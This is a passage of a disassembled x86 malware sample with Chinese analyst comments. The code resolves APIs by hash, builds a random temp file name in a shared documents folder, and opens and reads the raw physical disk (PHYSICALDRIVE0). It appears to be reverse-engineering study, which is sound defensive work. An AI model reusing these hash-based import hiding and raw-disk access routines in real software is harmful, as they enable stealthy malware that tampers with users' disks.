
```
.text:00401161 E8 9A FE FF FF    call    sub_401000            ; 获取kernel模块基地址

.text:00401166 50                push    eax

.text:00401167 E8 C4 FE FF FF    call    sub_401030            ; 获取LoadLibrary地址

.text:0040116C 83 C4 08          add     esp, 8

.text:0040116F A3 64 10 41 00    mov     AdrLoadLibrary, eax

.text:00401174 68 A0 7D 33 8A    push    8A337DA0h

.text:00401179 E8 82 FE FF FF    call    sub_401000

.text:0040117E 50                push    eax

.text:0040117F E8 AC FE FF FF    call    sub_401030            ; 同样的方式获取GetTickCount地址

.text:00401184 83 C4 08          add     esp, 8

.text:00401187 A3 60 10 41 00    mov     addrGetTickCount, eax

.text:0040118C 8D 44 24 08       lea     eax, [esp+14h+msvcrt.dll]

.text:00401190 68 F2 B0 9B 0C    push    0C9BB0F2h

.text:00401195 50                push    eax

.text:00401196 FF 15 64 10 41 00 call    AdrLoadLibrary

.text:0040119C 50                push    eax

.text:0040119D E8 8E FE FF FF    call    sub_401030            ; 获取0C9BB0f2h标志在Msrcvt模块中对应的函数地址
.text:0040119D                                                 ; 77C071D3：Rand函数

.text:004011A2 83 C4 08          add     esp, 8

.text:004011A5 8D 4C 24 08       lea     ecx, [esp+10h+var_8]

.text:004011A9 A3 58 10 41 00    mov     addrRand, eax

.text:004011AE 68 79 79 D8 4D    push    4DD87979h

.text:004011B3 51                push    ecx

.text:004011B4 FF 15 64 10 41 00 call    AdrLoadLibrary

.text:004011BA 50                push    eax

.text:004011BB E8 70 FE FF FF    call    sub_401030            ; 同样获取msvcrt中 sRand函数地址

.text:004011C0 8B 7C 24 20       mov     edi, [esp+1Ch+arg_0]

.text:004011C4 8B 74 24 24       mov     esi, [esp+1Ch+arg_4]

.text:004011C8 83 C4 08          add     esp, 8

.text:004011CB 3B FE             cmp     edi, esi

.text:004011CD A3 5C 10 41 00    mov     addrsRand, eax

.text:004011D2 75 08             jnz     short loc_4011DC

.text:004011D4 8B C7             mov     eax, edi

.text:004011D6 5F                pop     edi

.text:004011D7 5E                pop     esi

.text:004011D8 83 C4 0C          add     esp, 0Ch

.text:004011DB C3                retn

.text:004011DC                   ; ---------------------------------------------------------------------------

.text:004011DC                   loc_4011DC:                   ; CODE XREF: sub_401120+B2j

.text:004011DC FF 15 60 10 41 00 call    addrGetTickCount

.text:004011E2 50                push    eax

.text:004011E3 FF 15 5C 10 41 00 call    addrsRand

.text:004011E9 83 C4 04          add     esp, 4

.text:004011EC FF 15 58 10 41 00 call    addrRand

.text:004011F2 83 C0 03          add     eax, 3                ; 利用时间随机生成数，很通用的手法，呵呵。。

.text:004011F5 2B F7             sub     esi, edi

.text:004011F7 99                cdq

.text:004011F8 46                inc     esi

.text:004011F9 F7 FE             idiv    esi

.text:004011FB 8B C2             mov     eax, edx

.text:004011FD 03 C7             add     eax, edi

.text:004011FF 5F                pop     edi

.text:00401200 5E                pop     esi

.text:00401201 83 C4 0C          add     esp, 0Ch

.text:00401204 C3                retn

.text:00401204                   sub_401120 endp

.text:0040161D E8 FE FA FF FF    call    sub_401120            ; 随机数生成函数

.text:00401622 83 C4 08          add     esp, 8

.text:00401625 50                push    eax

.text:00401626 6A 79             push    79h

.text:00401628 6A 62             push    62h

.text:0040162A E8 F1 FA FF FF    call    sub_401120

.text:0040162F 83 C4 08          add     esp, 8

.text:00401632 50                push    eax

.text:00401633 6A 7A             push    7Ah

.text:00401635 6A 61             push    61h

.text:00401637 E8 E4 FA FF FF    call    sub_401120            ; 生成三个随机数

.text:0040163C 83 C4 08          add     esp, 8

.text:0040163F 8D 4C 24 40       lea     ecx, [esp+4B0h+var_470] ; 数据：堆栈地址=013BFB48, (ASCII "\%s%c%c%c.tmp")

.text:00401643 8D 94 24 AC 01 00+lea     edx, [esp+4B0h+tmpString2] ; 后面格式化保存地方

.text:0040164A 50                push    eax

.text:0040164B 8D 44 24 1C       lea     eax, [esp+4B4h+var_498] ; TVC 前面局部变量

.text:0040164F 50                push    eax

.text:00401650 51                push    ecx                   ; LPCSTR

.text:00401651 52                push    edx                   ; LPSTR

.text:00401652 FF 15 E8 60 40 00 call    ds:wsprintfA          ; 格式化 生成 013BFCB4  ASCII "\TVClhe.tmp" 后面三个数
.text:00401652                                                 ; 格式化为字符

.text:00401669 8C 24 A0 00 00+lea     ecx, [esp+4A8h+CurrentDeskTopPath]

.text:00401669 50                push    eax                   ; lpString2

.text:0040166A 51                push    ecx                   ; lpString1

.text:0040166B FF 15 1C 60 40 00 call    ds:lstrcatA           ; 和桌面路径结合生成路径
.text:0040166B                                                 ; "C:\Documents and Settings
.text:0040166B                                                 ; \All Users\Documents\My Videos\TVClhe.tmp"

.text:00401671 68 00 78 00 00    push    7800h                 ; \_DWORD

.text:00401676 FF 15 68 10 41 00 call    addrMalloc

.text:0040167C 83 C4 04          add     esp, 4

.text:0040167F 8B E8             mov     ebp, eax

.text:00401681 B9 00 1E 00 00    mov     ecx, 1E00h

.text:00401686 33 C0             xor     eax, eax

.text:00401688 53                push    ebx                   ; hTemplateFile

.text:00401689 68 80 00 00 10    push    10000080h             ; dwFlagsAndAttributes

.text:0040168E 6A 03             push    3                     ; dwCreationDisposition

.text:00401690 53                push    ebx                   ; lpSecurityAttributes

.text:00401691 8B FD             mov     edi, ebp

.text:00401693 6A 03             push    3                     ; dwShareMode

.text:00401695 8D 54 24 2C       lea     edx, [esp+4BCh+FileName]

.text:00401699 68 00 00 00 C0    push    0C0000000h            ; dwDesiredAccess

.text:0040169E F3 AB             rep stosd

.text:004016A0 52                push    edx                   ; lpFileName

.text:004016A1 FF 15 10 60 40 00 call    ds:CreateFileA        ; 打开物理设备PHYSICALDRIVE0
.text:004016A1                                                 ; :注释 一般\\.\PHYSICALDRIVE0可以表示
.text:004016A1                                                 ; 主机硬盘，通过createfile，和readfile可以读取信息
.text:004016A1                                                 ; 又啰嗦了一下

.text:004016B0 0F 84 40 02 00 00 jz      loc_4018F6

.text:004016B6 53                push    ebx                   ; dwMoveMethod

.text:004016B7 53                push    ebx                   ; lpDistanceToMoveHigh

.text:004016B8 53                push    ebx                   ; lDistanceToMove

.text:004016B9 56                push    esi                   ; hFile

.text:004016BA FF 15 0C 60 40 00 call    ds:SetFilePointer     ; 开始处进行准备定位读取

.text:004016C0 83 F8 FF          cmp     eax, 0FFFFFFFFh

.text:004016C3 0F 84 26 02 00 00 jz      loc_4018EF

.text:004016C9 8D 44 24 14       lea     eax, [esp+4A8h+NumberOfBytesRead]

.text:004016CD 53                push    ebx                   ; lpOverlapped

.text:004016CE 50                push    eax                   ; lpNumberOfBytesRead

.text:004016CF 68 00 78 00 00    push    7800h                 ; nNumberOfBytesToRead

.text:004016D4 55                push    ebp                   ; lpBuffer

.text:004016D5 56                push    esi                   ; hFile

.text:004016D6 FF 15 08 60 40 00 call    ds:ReadFile           ; 同样读取7800h 到开辟的空间

.text:004016DC 8A 4D 0A          mov     cl, [ebp+0Ah]
```
